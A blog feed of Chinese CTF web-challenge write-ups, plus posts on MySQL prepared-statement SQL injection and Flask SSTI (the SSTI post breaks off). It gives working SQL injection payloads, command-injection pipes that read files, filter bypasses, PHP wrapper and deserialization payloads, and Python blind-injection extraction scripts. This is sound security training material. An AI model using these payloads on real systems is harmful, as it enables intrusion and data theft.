<p>此题考察的就是简单的sql注入只不过要注意的是用group_concat()（这个是将组中的字符串连接成为具有各种选项的单个字符串函数）和concat_ws(&quot;?&quot;,?,?)（是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。）不然就显示不出来</p>
<p>首先一看是sql注入就判断是什么注入类型<br>
输入</p>
<pre><code>username：' or 1=1#
password：123
</code></pre>
<p>显示的是<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622969725148.png" alt="" loading="lazy"><br>
然后试着用这个账号和密码进行登录发现没有什么用一直都是同一个页面然后就进行sql注入的各种语句查表，列和最后所需要的值（密码随意不能不写写个123也行）</p>
<p>username：<br>
' or 1=1 order by 1,2,3,4#      多次试验后发现3回显正确<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622969728849.png" alt="" loading="lazy"><br>
' and 1=2 union select 1,2,3#       测试回显的是哪几个<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622969732155.png" alt="" loading="lazy"><br>
' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622969734968.png" alt="" loading="lazy"><br>
' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='l0ve1ysq1'#<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622969738399.png" alt="" loading="lazy"><br>
' and 1=2 union select 1,group_concat(concat_ws(&quot;:::&quot;,id,username,password)),3 from l0ve1ysq1#<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622969742646.png" alt="" loading="lazy"></p>
<h1 id="actf2020-新生赛exec1">[ACTF2020 新生赛]Exec1</h1>
<p>首先先ping一下127.0.0.1<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622969934067.png" alt="" loading="lazy"><br>
然后看看有什么文件直接127.0.0.1 | ls ../../../../../<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622969929957.png" alt="" loading="lazy"><br>
然后直接打开即可127.0.0.1 | cat ../../../../../flag<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622970016783.png" alt="" loading="lazy"></p>
<p>像这种什么都没过滤的题目，可以利用常见管道符直接执行命令:<br>
常见管道符</p>
<p>1、|（就是按位或），直接执行|后面的语句<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622970190689.png" alt="" loading="lazy"><br>
2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622970194252.png" alt="" loading="lazy"><br>
3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622970198223.png" alt="" loading="lazy"><br>
4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令<br>
这里没试出来flag，用cmd试一下：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622970203946.png" alt="" loading="lazy"><br>
5、;（linux下有的，和&amp;一样的作用）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622970207060.png" alt="" loading="lazy"><br>
命令执行漏洞可以看这位师傅的博客：<br>
http://www.ghtwf01.cn/index.php/archives/273/</p>
<p>参考自：https://blog.csdn.net/weixin_44348894/article/details/105347418?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</p>
<h1 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping</h1>
<p>打开是这样子的。给了/?ip= 后边应该是我们所想要执行的语句。先随便ping一下<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622971962814.png" alt="" loading="lazy"><br>
有回显，我们在在后边继续执行语句。先查看一下ls;<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622971965668.png" alt="" loading="lazy"><br>
这里发现终端有一个flag.php和一个Index.php<br>
cat flag.php一下试一试<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622971968514.png" alt="" loading="lazy"><br>
发现空格被过滤了,去百度查询了一下绕过空格的几个办法<br>
**空格过滤 **</p>
<pre><code>${IFS}替换
$IFS$1替换
${IFS替换
%20替换
&lt;和&lt;&gt;重定向符替换
%09替换
</code></pre>
<p>我们一个个来试一下<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622971972295.png" alt="" loading="lazy"><br>
用第一个<code>${IFS}</code>时候发现符号被过滤了</p>
<p>使用第二个<code>$IFS$1</code>发现可以 说明{}被过滤了,但出现了<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622971975513.png" alt="" loading="lazy"><br>
这样说明flag被过滤了 去看一下Index.php<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622971979305.png" alt="" loading="lazy"><br>
发现源码出来了。可以看到flag.&lt;&gt;.{}都被过滤了。bash也被过滤。这时候我们可以想着试一下变量拼接.<br>
?ip=1;a=g;cat$IFS<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mi>f</mi><mi>l</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">1fla</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span></span></span></span>a.php;<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622971982645.png" alt="" loading="lazy"><br>
打开源码即可看到flag</p>
<h1 id="极客大挑战-2019knife">[极客大挑战 2019]Knife</h1>
<p>提示很明显说明此题使用蚁剑进行连接所需传入的东西已经万全准备就绪<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622978455383.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1622978459228.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1622978462363.png" alt="" loading="lazy"></p>
<h1 id="极客大挑战-2019http1">[极客大挑战 2019]Http1</h1>
<p>打开网页发现啥也没有然后就查看源码发现有一个Secret.php<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622979681162.png" alt="" loading="lazy"><br>
然后用burpsuite抓包然后一直发送发送给repeater因为可以多次提交<br>
然后打开发现<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622979967597.png" alt="" loading="lazy"><br>
添加这个：Referer:https://www.Sycsecret.com<br>
然后发送<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622979970427.png" alt="" loading="lazy"><br>
然后修改User-Agent:Syclover<br>
然后发送<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622979973326.png" alt="" loading="lazy"><br>
然后添加X-Forwarded-For:127.0.0.1<br>
然后<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622979977436.png" alt="" loading="lazy"><br>
总体修改<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622979980999.png" alt="" loading="lazy"></p>
<h1 id="zjctf-2019nizhuansiwei">[ZJCTF 2019]NiZhuanSiWei</h1>
<p>1:data伪协议写入文件<br>
2：php://</p>
<p>php://filter用于读取源码<br>
php://input用于执行php代码</p>
<p>3反序列化</p>
<p>打开题目，给了我们源码</p>
<pre><code>&lt;?php  
$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];
if(isset($text)&amp;&amp;(file_get_contents($text,'r')===&quot;welcome to the zjctf&quot;)){
echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,'r').&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
if(preg_match(&quot;/flag/&quot;,$file)){
echo &quot;Not now!&quot;;
exit(); 
}else{
include($file);  //useless.php
$password = unserialize($password);
echo $password;
}
}
else{
highlight_file(__FILE__);
}?&gt;
</code></pre>
<p>第一个绕过：</p>
<pre><code>if(isset($text)&amp;&amp;(file_get_contents($text,'r')===&quot;welcome to the zjctf&quot;))
</code></pre>
<p>这里需要我们传入一个文件且其内容为welcome to the zjctf，这样的话往后面看没有其他可以利用的点，我们就无法写入文件再读取，就剩下了一个data伪协议。data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数取读取。构造如下：</p>
<pre><code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
</code></pre>
<p>当然也可以不需要base64，但是一般为了绕过某些过滤都会用到base64。data://text/plain,welcome to the zjctf</p>
<p>第二个绕过</p>
<pre><code>$file = $_GET[&quot;file&quot;];
if(preg_match(&quot;/flag/&quot;,$file)){
echo &quot;Not now!&quot;;
exit(); 
}else{
include($file);  //useless.php
$password = unserialize($password);
echo $password;
}
</code></pre>
<p>这里有file参数可控，但是无法直接读取flag，可以直接读取/etc/passwd，但针对php文件我们需要进行base64编码，否则读取不到其内容，所以以下无法使用：</p>
<pre><code>file=useless.php
</code></pre>
<p>所以下面采用filter来读源码，但上面提到过针对php文件需要base64编码，所以使用其自带的base64过滤器。</p>
<pre><code>php://filter/read=convert.base64-encode/resource=useless.php
</code></pre>
<p>读到的useless.php内容如下：</p>
<pre><code>&lt;?php  
class Flag{  //flag.php  
public $file;  
public function __tostring(){  
if(isset($this-&gt;file)){  
echo file_get_contents($this-&gt;file); 
echo &quot;&lt;br&gt;&quot;;
return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
}  
}  
}  
?&gt;
</code></pre>
<p>第三个绕过</p>
<pre><code>$password = $_GET[&quot;password&quot;];
include($file);  //useless.php
$password = unserialize($password);
echo $password;
</code></pre>
<p>这里的file是我们可控的，所以在本地测试后有执行下面代码即可出现payload：</p>
<pre><code>&lt;?php  
class Flag{  //flag.php  
public $file=&quot;flag.php&quot;;  
public function __tostring(){  
if(isset($this-&gt;file)){  
echo file_get_contents($this-&gt;file); 
echo &quot;&lt;br&gt;&quot;;
return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
}  
}  
}  
$a = new Flag();
echo serialize($a);
?&gt;
//O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}
</code></pre>
<p>最后payload</p>
<pre><code>http://6619a3b1-daa6-4ab9-bb3d-ba8b90593516.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D
</code></pre>
<p>参考链接https://www.redmango.top/articles/article/40/</p>
<p>simple sql 简单的sql过滤绕过<br>
寻找注入点<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624089368829.png" alt="" loading="lazy"><br>
只有一个输入框，抓包看是post提交。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624089372575.png" alt="" loading="lazy"><br>
依次输入</p>
<pre><code>' =&gt; bool(false)
and 1=1 =&gt; SQL Injection Checked.
2 =&gt; 显示正常
3 =&gt; Error Occured When Fetch Result.
看起来有过滤，先fuzz下过滤了哪些关键词，利用intrude模块：
（下载了一份fuzz dict: dictionary-master）
使用 sql_fuzz.txt 字典 
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1624089377469.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1624089381519.png" alt="" loading="lazy"><br>
但是 ascii/regexp/substr等函数都没过滤。xor被过滤，但是 ^/|/= 没有过滤，所以可以构造一个true表达式：<br>
0^(2&gt;1) =&gt; Hello this is Aurora<br>
0^(2&gt;1) =&gt; Error Occured When Fetch Result.<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624089385693.png" alt="" loading="lazy"><br>
因此，注入点就是：<br>
0^(TRUE表达式) =&gt; 返回 Hello this is Auro<br>
0^(False表达式) =&gt; 返回 Error Occured When Fetch Result.<br>
构造注入语句</p>
<p>这里以ascii为例，参考：https://www.anquanke.com/post/id/160584#h2-11</p>
<p>ascii(mid((password)from(i)))&gt;j</p>
<p>这个语句中，涉及到mysql的 mid 和 ascii 函数</p>
<pre><code>mid函数的使用方法：
正常的用法如下，对于str字符串，从pos作为索引值位置开始，返回截取len长度的子字符串
MID(str,pos,len)
这里的用法是，from(1)表示从第一个位置开始截取剩下的字符串，from(0)是没有值的。for(1)表示从改位置起一次就截取一个字符，本题for被过滤了。
</code></pre>
<p>对应的构造select语句：</p>
<pre><code>select flag from flag //要返回str，要求flag表只有一行
mid((select flag from flag )from(1))  // 获取第一个
ascii(mid((select flag from flag )from(1)))=102 // ascii('flag') 默认只返回f的ascii值，f对应102
ascii(mid((select%0aflag%0afrom%0aflag)from(1)))=102 // 绕过空格过滤  
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1624089391290.png" alt="" loading="lazy"><br>
正常显示 id=1 的内容，说明答案的第一个字符是f。<br>
编写 exp 程序</p>
<p>知道了注入点，剩下的就是自动化。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624089395786.png" alt="" loading="lazy"><br>
先在python里面验证下，发现同样的payload，在burp可以，代码却不行。唯一的原因就在 %0a 这个编码的地方了。<br>
参考这篇文章：https://blog.csdn.net/M1mory/article/details/58309378<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624089400139.png" alt="" loading="lazy"><br>
加上代理，自己在burp可以看到requests发包的情况，还要加上 content-type 头部，否则无返回信息<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624089404183.png" alt="" loading="lazy"><br>
基于此，写出exp代码：</p>
<pre><code>import requests

dict = &quot;fabcdeghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_1234567890{}&quot;

url = &quot;http://polarlicht.xyz:8302/index.php&quot;
headers = {&quot;Content-Type&quot; : &quot;application/x-www-form-urlencoded&quot;}
proxy = {&quot;http&quot; : 'http://127.0.0.1:8080'}

ret = []
for i in range(1,20):
for c in dict:
payload = &quot;id=0^(ascii(mid((select%0aflag%0afrom%0aflag)from({0})))={1})&quot;.format(str(i), str(ord(c)))
r = requests.post(url, data=payload, headers=headers, proxies = proxy)
if len(r.text) == 299:
ret.append(c)
print(&quot;[%d]%s=&gt;%s\t%s&quot; % (i, c, len(r.text), payload))

print(''.join(ret))
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1624089407690.png" alt="" loading="lazy"><br>
这段代码速度太慢，用二分法进行代码优化：</p>
<pre><code>import requests

url = &quot;http://polarlicht.xyz:8302/index.php&quot;
headers = {&quot;Content-Type&quot; : &quot;application/x-www-form-urlencoded&quot;}
proxy = {&quot;http&quot; : 'http://127.0.0.1:8080'}

def check(i, index):
payload = &quot;id=0^(ascii(mid((select%0aflag%0afrom%0aflag)from({0})))={1})&quot;.format(i, index)
r = requests.post(url, data=payload, proxies=proxy, headers = headers)
if r.text.find('Hello') &gt;= 0:
return 0

payload = &quot;id=0^(ascii(mid((select%0aflag%0afrom%0aflag)from({0})))&gt;{1})&quot;.format(i, index)
r = requests.post(url, data=payload, proxies=proxy, headers=headers)
if r.text.find('Hello') &gt;= 0:
return 1

return -1
</code></pre>
<h1 id="二分实现">二分实现</h1>
<pre><code>mids = []
for i in range(1, 20):
# ascii 可显示字符是33到126
start = 33
end = 126
mid = (start + end) // 2


while start &lt;= mid:
if check(i, mid) == 0:
mids.append(mid)
break

if check(i, mid) &gt; 0:
start = mid
mid = (start + end) // 2
else:
end = mid
mid = (start + end) // 2
tmp = &quot;start=&gt;{0},mid={1},end={2}&quot;.format(start,mid,end)
print(''.join(chr(x) for x in mids))
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://jinqipiaopiao.github.io//post-images/1624089437125.png" alt="" loading="lazy"></figure>
<h1 id="网鼎杯-2020-青龙组areuserialz">[网鼎杯 2020 青龙组]AreUSerialz</h1>
<p>1.题目源码</p>
<pre><code>&lt;?php

include(&quot;flag.php&quot;);

highlight_file(__FILE__);

class FileHandler {

protected $op;
protected $filename;
protected $content;

function __construct() {
$op = &quot;1&quot;;
$filename = &quot;/tmp/tmpfile&quot;;
$content = &quot;Hello World!&quot;;
$this-&gt;process();
}

public function process() {
if($this-&gt;op == &quot;1&quot;) {
$this-&gt;write();
} else if($this-&gt;op == &quot;2&quot;) {
$res = $this-&gt;read();
$this-&gt;output($res);
} else {
$this-&gt;output(&quot;Bad Hacker!&quot;);
}
}

private function write() {
if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
if(strlen((string)$this-&gt;content) &gt; 100) {
$this-&gt;output(&quot;Too long!&quot;);
die();
}
$res = file_put_contents($this-&gt;filename, $this-&gt;content);
if($res) $this-&gt;output(&quot;Successful!&quot;);
else $this-&gt;output(&quot;Failed!&quot;);
} else {
$this-&gt;output(&quot;Failed!&quot;);
}
}

private function read() {
$res = &quot;&quot;;
if(isset($this-&gt;filename)) {
$res = file_get_contents($this-&gt;filename);
}
return $res;
}

private function output($s) {
echo &quot;[Result]: &lt;br&gt;&quot;;
echo $s;
}

function __destruct() {
if($this-&gt;op === &quot;2&quot;)
$this-&gt;op = &quot;1&quot;;
$this-&gt;content = &quot;&quot;;
$this-&gt;process();
}

}

function is_valid($s) {
for($i = 0; $i &lt; strlen($s); $i++)
if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
return false;
return true;
}

if(isset($_GET{'str'})) {

$str = (string)$_GET['str'];
if(is_valid($str)) {
$obj = unserialize($str);
}

}
</code></pre>
<p>这是一个PHP反序列化的题目，首先看到需要传入一个’str’，而且通过is_valid()规定了传入的每一个字符的ASCII码的范围必须在32到125之间，然后对这个’str’进行反序列化操作。</p>
<p>在反序列化中，先调用__destruct()析构方法：</p>
<pre><code>function __destruct() {
if($this-&gt;op === &quot;2&quot;)
$this-&gt;op = &quot;1&quot;;
$this-&gt;content = &quot;&quot;;
$this-&gt;process();
}
</code></pre>
<p>从__destruct()代码中可以看到，如果op === “2”，那么op会被赋值为&quot;1&quot;，然后content会赋值为空，并执行process函数，这里 if 中的判断语句用的是强类型比较。<br>
然后看看process函数：</p>
<pre><code>public function process() {
if($this-&gt;op == &quot;1&quot;) {
$this-&gt;write();
} else if($this-&gt;op == &quot;2&quot;) {
$res = $this-&gt;read();
$this-&gt;output($res);
} else {
$this-&gt;output(&quot;Bad Hacker!&quot;);
}
}
</code></pre>
<p>代码内容为：如果op == “1”，执行write()函数;如果op ==“2”,执行read函数，同时将结果赋值给$res，然后输出；否则将输出&quot;Bad Hacker！&quot;。</p>
<p>这里 if 语句中的判断语句用的是弱类型的比较，那么只要op=2，这个是int整数型的2，那么op === “2” 则为False， op == &quot;2&quot;则为True，就可以进入read函数。</p>
<p>再看看read函数：</p>
<pre><code>private function read() {
$res = &quot;&quot;;
if(isset($this-&gt;filename)) {
$res = file_get_contents($this-&gt;filename);
}
return $res;
}
</code></pre>
<p>在read函数中，使用filename调用file_get_contents函数将文件内容赋值给$res输出。</p>
<p>这里的filename是我们可控的，那么可以用前不久学的php://filter伪协议读取文件。然后使用output函数输出。</p>
<pre><code>private function output($s) {
echo &quot;[Result]: &lt;br&gt;&quot;;
echo $s;
}
</code></pre>
<p>那么现在整个反序列过程就清楚了：<br>
1.将op = 2<br>
2.filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</p>
<pre><code>&lt;?php
class FileHandler {

protected $op=2;
protected $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;
protected $content;

}

$a = new FileHandler();
echo serialize($a);
?&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1624333261046.png" alt="" loading="lazy"><br>
原因是在于 <code>$op $filename $content</code>三个变量权限都是protected，而protected权限的变量在序列化时会有%00*%00字符，%00字符的ASCII码为0，不在is_valid函数规定的32到125的范围内。<br>
可以使用一种简单的办法绕过：因为php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public就可以了。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624333257382.png" alt="" loading="lazy"><br>
那么现在就可以使用这个payload来读取flag：</p>
<pre><code>?str=O:11:%22FileHandler%22:3:{s:2:%22op%22;i:2;s:8:%22filename%22;s:57:%22php://filter/read=convert.base64-encode/resource=flag.php%22;s:7:%22content%22;N;
</code></pre>
<p>然后进行解码即可<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624333252468.png" alt="" loading="lazy"><br>
总结：<br>
1.区分强类型比较和弱类型比较进行绕过<br>
2.加深对php序列化和反序列化过程的理解</p>
<p>php序列化与反序列化方法：</p>
<pre><code>__construct 当一个对象创建时被调用
__destruct 当一个对象销毁时被调用
__toString 当一个对象被当作一个字符串使用
__sleep 在对象被序列化之前运行
__wakeup 在对象被反序列化之后被调用
</code></pre>
<p>参考：<br>
https://www.freebuf.com/articles/web/209975.html<br>
https://www.cnblogs.com/tr1ple/p/11156279.html</p>
<p>————————————————<br>
版权声明：本文为CSDN博主「嗯？？嗯。」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/qq_40860153/article/details/109018483</p>
<h1 id="gxyctf2019babysqli">[GXYCTF2019]BabySQli#</h1>
<p>这题的知识点是绕过密码的md5验证，参考Y1ng师傅的文章<br>
看到题目，fuzz了一下，过滤的并不多(415是没过滤的，419是过滤的)<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624336018360.png" alt="" loading="lazy"><br>
而且页面源码有给sql语句，不过需要先base32再base64解码</p>
<pre><code>select * from user where username = '$name'
</code></pre>
<p>直接可以用联合注入，表里有三列</p>
<pre><code>1' Order by 3#
</code></pre>
<p>进行用联合注入，回显wrong user!，说明用户不在第一列</p>
<pre><code>1' union select 1,2,3#
</code></pre>
<p>尝试将用户名放在第二列，回显wrong pass!，找到用户名在第二列</p>
<pre><code>1' union select 1,'admin',3#
</code></pre>
<p>接下里就是要绕过密码的md5验证，需要把我们输入的值和数据库里面存放的用户密码的md5值进行比较，那要怎么绕过呢？可以用联合查询语句用来生成虚拟的表数据</p>
<p>首先可以看到该表只有一个用户<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624336023503.png" alt="" loading="lazy"><br>
然后我们可以用联合查询的方式将查询的数据插入到表中<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624336026579.png" alt="" loading="lazy"></p>
<p>通过这样的方式，我们就可以用构造payload</p>
<p>用户名输入（‘e10adc3949ba59abbe56e057f20f883e’是 123456的md5值）</p>
<pre><code>1' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#
</code></pre>
<p>密码输入</p>
<pre><code>123456
</code></pre>
<p>POST请求 ,获得flag<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624336030766.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[利用预编译来SQL注入]]></title>
        <id>https://jinqipiaopiao.github.io/post/li-yong-yu-bian-yi-lai-sql-zhu-ru/</id>
        <link href="https://jinqipiaopiao.github.io/post/li-yong-yu-bian-yi-lai-sql-zhu-ru/">
        </link>
        <updated>2021-06-05T07:07:44.000Z</updated>
        <content type="html"><![CDATA[<p>在做CTF时遇到这样一个题目，注入点过滤了SELECT和.还有WHERE等关键词，但是支持多语句查询，这样是可以看到库名列名的，利用如下的方式:</p>
<pre><code>id=1';show tables;%23
</code></pre>
<p>但是没法查询字段，于是就可以利用构建预编译语句来绕过过滤。</p>
<p>利用此方法的前提是支持多语句查询。</p>
<p>先来谈谈什么叫预编译，实际上它经常被用来防止SQL注入，介于SQL注入的根本原理是未将数据与代码有效区分开，预编译的目的就在于解决这一点。</p>
<p>我们常见的有关防止SQL注入的预编译手段都是基于后端代码的，即PHP或Java的PDO，而这次的用法就是使用SQL命令直接预编译语句。</p>
<p>MySQL的预编译语法为：</p>
<p>//定义预编译语句</p>
<pre><code>PREPARE stmt_name FROM preparable_stmt;
</code></pre>
<p>//执行预编译语句</p>
<pre><code>EXECUTE stmt_name [USING @var_name [, @var_name] ...];
</code></pre>
<p>解释一下，定义的时候，preparable_stmt代表的是预留数据位置的SQL语句，而stmt_name是类似变量名，代表这个SQL语句，下面举个例子：</p>
<pre><code>PREPARE test FROM 'SELECT (? + ?)';
</code></pre>
<p>//即定义了一个两数相加的SQL预编译语句<br>
执行时，@var_name即变量，可以带入语句中进行执行，如：</p>
<pre><code>SET @a = 1;
SET @b = 2; //给变量赋值

EXECUTE test USING @a,@b;//执行
</code></pre>
<p>这道题目主要就是利用此方法来绕过黑名单，其具体方法也不止一种，可以利用concat()将关键词分开处理，也可以将整个语句使用char()处理后执行。<br>
原文地址为：https://eviladan0s.github.io/2020/03/08/sql_trick/</p>
<p>未经授权禁止转载<br>
作者：白袍大人<br>
https://www.bilibili.com/read/cv5071554/<br>
出处： bilibili</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Python-模板注入]]></title>
        <id>https://jinqipiaopiao.github.io/post/python-mo-ban-zhu-ru/</id>
        <link href="https://jinqipiaopiao.github.io/post/python-mo-ban-zhu-ru/">
        </link>
        <updated>2021-06-04T02:15:31.000Z</updated>
        <content type="html"><![CDATA[<p>何为模板注入？<br>
模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，哲大大提升了开发效率，良好的设计也是的代码重用变得更加容易。<br>
到那时模板引擎也拓宽了我们的攻击面，注入到模板中的代码可能会引发RCE或者XSS<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622774211791.png" alt="" loading="lazy"><br>
flask基础<br>
在学习SSTI之前，先把flask的运作流程搞明白，这样有利于更加快速的理解原理<br>
路由<br>
先看一段代码</p>
<pre><code>from flask import flask

@app.route('/index/')
def hello_word():
return 'hello world'
</code></pre>
<p>route装饰器的作用是将函数与url绑定起来。例子中的代码的作用就是当你访问http:127.0.0.1：5000/index的时候，flask会返回hello world<br>
渲染方法<br>
flask的渲染方法有render_template和render_template_string两种。<br>
render_template()是用来渲染一个指定文件的。使用如下</p>
<pre><code>return render_template('indexhtml')
</code></pre>
<p>render_template_string则是用来渲染一个字符串的。SSTI与这个方法密不可分<br>
使用方法如下</p>
<pre><code>html='&lt;h1&gt;This is index page&lt;/h1&gt;'
return render_template_string(html)
</code></pre>
<p>模板<br>
flask时使用Jinja2来作为渲染引擎的。看例子<br>
在网站的根目录下新建templates文件夹，这里是用来存放html文件。也就是模板文件。</p>
<p>test.py</p>
<pre><code>from flask import Flask,url_for,redirect,render_template,render_template_string
@app.route('/index/')
def user_login():
return render_template('index.html')
</code></pre>
<p>/templates/index.html</p>
<pre><code>&lt;h1&gt;This is index page&lt;/h1&gt;
</code></pre>
<p>访问127.0.0.1:5000/index/的时候，flask就会渲染出index.html的页面。</p>
<p>模板文件并不是单纯的html代码，而是夹杂着模板的语法，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。</p>
<p>例子</p>
<p>test.py</p>
<pre><code>from flask import Flask,url_for,redirect,render_template,render_template_string
@app.route('/index/')
def user_login():
return render_template('index.html',content='This is index page.')

/templates/index.html

&lt;h1&gt;{{content}}&lt;/h1&gt;
</code></pre>
<p>这个时候页面仍然输出This is index page。</p>
<p><code>{{}}</code>在Jinja2中作为变量包裹标识符。<br>
模板注入</p>
<p>不正确的使用flask中的render_template_string方法会引发SSTI。那么是什么不正确的代码呢？<br>
xss利用</p>
<p>存在漏洞的代码</p>
<pre><code>@app.route('/test/')
def test():
code = request.args.get('id')
html = '''
&lt;h3&gt;%s&lt;/h3&gt;
'''%(code)
return render_template_string(html)
</code></pre>
<p>这段代码存在漏洞的原因是数据和代码的混淆。代码中的code是用户可控的，会和html拼接后直接带入渲染。</p>
<p>尝试构造code为一串js代码。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622774927945.png" alt="" loading="lazy"><br>
将代码改为如下</p>
<pre><code>@app.route('/test/')
def test():
code = request.args.get('id')
return render_template_string('&lt;h1&gt;{{ code }}&lt;/h1&gt;',code=code)
</code></pre>
<p>继续尝试<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622774932382.png" alt="" loading="lazy"><br>
可以看到，js代码被原样输出了。这是因为模板引擎一般都默认对渲染的变量值进行编码转义，这样就不会存在xss了。在这段代码中用户所控的是code变量，而不是模板内容。存在漏洞的代码中，模板内容直接受用户控制的。<br>
Flask模板注入</p>
<p>解析：</p>
<p>众所周知ssti要被<code>{{}}</code>包括。接下来的代码均要包括在ssti中。</p>
<p>1.几种常用于ssti的魔术方法</p>
<p><strong>class</strong>  返回类型所属的对象<br>
<strong>mro</strong>    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br>
<strong>base</strong>   返回该对象所继承的基类<br>
// __base__和__mro__都是用来寻找基类的</p>
<p><strong>subclasses</strong>   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br>
<strong>init</strong>  类的初始化方法<br>
<strong>globals</strong>  对包含函数全局变量的字典的引用<br>
<strong>builtins</strong> builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块</p>
<p>2.获取基类的几种方法</p>
<pre><code>[].__class__.__base__
''.__class__.__mro__[2]
().__class__.__base__
{}.__class__.__base__
request.__class__.__mro__[8] 　　//针对jinjia2/flask为[9]适用
或者
[].__class__.__bases__[0]       //其他的类似
</code></pre>
<p>3.获取基本类的子类<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622774939374.png" alt="" loading="lazy"><br>
ssti的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件的类）加以利用。</p>
<p>那么我们可以利用的类有哪些呢？</p>
<p>4.利用</p>
